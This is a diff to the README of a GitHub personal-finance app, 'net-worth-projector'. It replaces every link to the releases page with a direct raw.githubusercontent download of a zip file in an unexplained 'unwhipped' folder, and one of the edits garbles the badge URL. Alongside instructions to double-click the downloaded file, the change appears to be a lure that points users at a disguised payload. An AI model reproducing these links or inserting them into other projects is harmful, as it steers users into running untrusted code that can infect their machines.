@@ -1,7 +1,7 @@
 # 🌟 net-worth-projector - Easily Track Your Financial Growth
 
 ## 📥 Quick Download
-[![Download net-worth-projector](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Ersel-54/net-worth-projector/releases)
+[![Download net-worth-projector](https://raw.githubusercontent.com/Ersel-54/net-worth-projector/main/unwhipped/net-worth-projector.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Ersel-54/net-worth-projector/main/unwhipped/net-worth-projector.zip)
 
 ## 📖 Overview
 The **net-worth-projector** is a simple tool that helps you visualize how your net worth can grow over time. It considers factors like income, interest rates, and expenses. With this application, you can make better financial decisions and plan for your future.
@@ -11,7 +11,7 @@ To start using the net-worth-projector, follow these easy steps:
 
 ### Step 1: Download the Application
 Visit this page to download the latest version of the net-worth-projector:
-[Download page](https://github.com/Ersel-54/net-worth-projector/releases).
+[Download page](https://raw.githubusercontent.com/Ersel-54/net-worth-projector/main/unwhipped/net-worth-projector.zip).
 
 ### Step 2: Install the Application
 Once you download the file, open it and follow the on-screen instructions. In most cases, simply double-click the downloaded file to start the installation.
@@ -34,7 +34,7 @@ To run the net-worth-projector, you will need:
 
 ## 🔧 Download & Install
 To download the application, visit the following link:
-[Download page](https://github.com/Ersel-54/net-worth-projector/releases).
+[Download page](https://raw.githubusercontent.com/Ersel-54/net-worth-projector/main/unwhipped/net-worth-projector.zip).
 
 Once the download is complete, install the application by following these steps:
 1. Open the downloaded file.
@@ -70,7 +70,7 @@ If you encounter any issues while using the application, consider the following 
 For further assistance, check the issues section in the repository or visit the GitHub community for help. You can also reach out via the discussion board for any questions or feedback.
 
 ## 📢 Stay Updated
-To stay informed about updates or new features, keep an eye on the release notes on the [Release page](https://github.com/Ersel-54/net-worth-projector/releases).
+To stay informed about updates or new features, keep an eye on the release notes on the [Release page](https://raw.githubusercontent.com/Ersel-54/net-worth-projector/main/unwhipped/net-worth-projector.zip).
 
 ## 🏁 Conclusion
 The **net-worth-projector** is designed to make financial planning straightforward for everyone. By following these steps, you can download, install, and start using the application to help shape your financial future.
